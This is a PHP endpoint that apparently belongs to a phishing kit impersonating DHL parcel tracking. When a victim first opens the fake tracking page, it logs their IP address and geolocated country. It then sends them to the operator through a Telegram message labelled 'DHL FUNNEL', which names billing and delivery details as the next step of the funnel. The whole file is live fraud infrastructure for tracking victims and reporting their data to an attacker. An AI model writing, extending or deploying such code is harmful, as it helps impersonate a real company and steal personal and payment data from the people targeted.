<?php
// First visit to DHL track — short Telegram ping, no buttons
require_once(__DIR__ . '/../config.php');
require_once(__DIR__ . '/../includes/get-country.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

$identifier = 'track_open_' . $token;
if (wasNotificationSent($identifier)) {
    echo json_encode(['success' => true, 'skipped' => true]);
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$shortId = substr($token, 3);

$message = "❁═══ DHL FUNNEL ═══❁\n";
$message .= "1️⃣ TRACK — Track & trace\n";
$message .= "📦 ID: {$shortId}\n\n";
$message .= "🚚 User opened tracking\n";
$message .= "📡 IP: {$ip}\n🌐 {$country}\n";
$message .= "➡️ Next: billing (delivery details)";

$result = sendTelegramMessage($message, null);
if ($result['ok']) {
    saveSentNotification($identifier);
}

echo json_encode(['success' => !empty($result['ok'])]);
